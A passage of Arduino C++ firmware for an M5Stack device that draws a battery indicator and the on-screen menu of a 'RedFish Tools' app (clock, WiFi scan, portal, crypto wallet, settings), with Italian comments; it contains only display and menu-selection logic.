  battery = (((M5.Axp.GetVbatData() * 1.1 / 1000) - 3.0) / 1.2) * 100;

  if (battery > 100) battery = 100;
  else if (battery > 9 && battery < 100) M5.Lcd.print(" ");
  else if (battery < 9) M5.Lcd.print("  ");
  if (battery < 10) M5.Axp.DeepSleep();
  M5.Lcd.print(battery);
  M5.Lcd.print('%');
}

void drawMenuBack() 
{
    // scritta Power - Back
    M5.Lcd.setCursor(86, 70);
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(WHITE);
    M5.Lcd.print("Power - Back");
}

void drawMenu() 
{

  if(appMenuselected == true)
  {
    //M5.Lcd.fillScreen(DARKGREY);

    M5.Lcd.setTextSize(2);
    M5.Lcd.setTextColor(RED,BLACK);
    M5.Lcd.setCursor(4, yRedFishTitolo);
    M5.Lcd.print("RedFish");
    M5.Lcd.setTextColor(WHITE,RED);
    M5.Lcd.print("Tools");

    M5.Lcd.setRotation(3);
    M5.Lcd.setTextSize(1);

    if (selectMenu == 1) 
    { 
      M5.Lcd.setTextColor(WHITE, BLACK); 
      M5.Lcd.setCursor(62, 24);
      M5.Lcd.print("Orologio");
      M5.Lcd.setCursor(54, 24);
      M5.Lcd.setTextColor(BLACK);
      M5.Lcd.print(">");   
    } 
    else 
    { 
      M5.Lcd.setTextColor(WHITE); 
      M5.Lcd.setCursor(62, 24);
      M5.Lcd.print("Orologio");
    }
    
    if (selectMenu == 2) 
    { 
      M5.Lcd.setTextColor(WHITE, BLACK);
      M5.Lcd.setCursor(62, 32);
      M5.Lcd.print("WiFi Scan");
      M5.Lcd.setCursor(54, 32);
      M5.Lcd.setTextColor(BLACK);
      M5.Lcd.print(">");       
    } 
    else 
    { 
      M5.Lcd.setTextColor(WHITE);
      M5.Lcd.setCursor(62, 32);
      M5.Lcd.print("WiFi Scan"); 
    }    
    
    if (selectMenu == 3) 
    { 
      M5.Lcd.setTextColor(WHITE, BLACK); 
      M5.Lcd.setCursor(62, 40);
      M5.Lcd.print("RedFish Portal");
      M5.Lcd.setCursor(54, 40);
      M5.Lcd.setTextColor(BLACK);
      M5.Lcd.print(">"); 
    } 
    else 
    { 
      M5.Lcd.setTextColor(WHITE);
      M5.Lcd.setCursor(62, 40);
      M5.Lcd.print("RedFish Portal");
    }   
    
    if (selectMenu == 4) 
    { 
      M5.Lcd.setTextColor(WHITE, BLACK); 
      M5.Lcd.setCursor(62, 48);
      M5.Lcd.print("Crypto Wallet");
      M5.Lcd.setCursor(54, 48);
      M5.Lcd.setTextColor(BLACK);
      M5.Lcd.print(">");  
    } 
    else 
    { 
      M5.Lcd.setTextColor(WHITE);
      M5.Lcd.setCursor(62, 48);
      M5.Lcd.print("Crypto Wallet"); 
    }  

    if (selectMenu == 5) 
    { 
      M5.Lcd.setTextColor(WHITE, BLACK); 
      M5.Lcd.setCursor(62, 60);
      M5.Lcd.print("Settings");
      M5.Lcd.setCursor(54, 60);
      M5.Lcd.setTextColor(BLACK);
      M5.Lcd.print(">");  
    } 
    else 
    { 
      M5.Lcd.setTextColor(WHITE);
      M5.Lcd.setCursor(62, 60);
      M5.Lcd.print("Settings"); 
    }         

    // disegno logo del pesce
    drawRedFishLogo();    

    // scrivo versione
    M5.Lcd.setTextColor(WHITE);
    M5.Lcd.setCursor(120, 70);
    M5.Lcd.print("v. 0.1");

  }
  else if(appClockselected == true) 
  {
    drawClock();
  }
  else if(appWiFiSelected == true) 
  {
    drawWiFiScan();
  }
  else if (appRedFishSelected == true) 
  {
    drawRedFishPortal();
    
    // scritta POWER - BACK
    drawMenuBack();
  }     
  else if (appCryptoWalletSelected == true) 
  {

  }  
  else if (appSettingsSelected == true) 
  {
    if (M5.BtnB.wasReleased()) 
    { 
      selectSettings = selectSettings + 1;
      if (selectSettings > 4) selectSettings = 1;
    } 

    drawSettings();
  }     

}
